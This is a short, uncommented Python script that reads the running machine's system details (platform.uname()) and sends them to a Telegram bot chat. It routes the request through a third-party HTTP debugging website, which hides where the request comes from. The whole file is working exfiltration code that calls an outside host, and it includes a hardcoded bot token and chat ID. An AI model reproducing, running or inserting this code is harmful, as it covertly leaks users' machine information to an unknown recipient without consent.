import platform
import requests

sysInfo = platform.uname()

url1 = "http://api.telegram.org/bot5275850028:AAHUpuPEpq2ZGyNnXXhbUeRpq5S9Di9kDlY/sendmessage?chat_id=1189974984&text="+str(sysInfo)+"\n http://api.telegram.org/bot5275850028:AAHUpuPEpq2ZGyNnXXhbUeRpq5S9Di9kDlY/sendmessage?chat_id=1189974984&text="

dic_info = {"UrlBox": url1 ,
            "AgentList":"Google Chrome",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST",
            }
http = requests.post("https://www.httpdebugger.com/tools/viewhttpheaders.aspx",data=dic_info)

print(http)
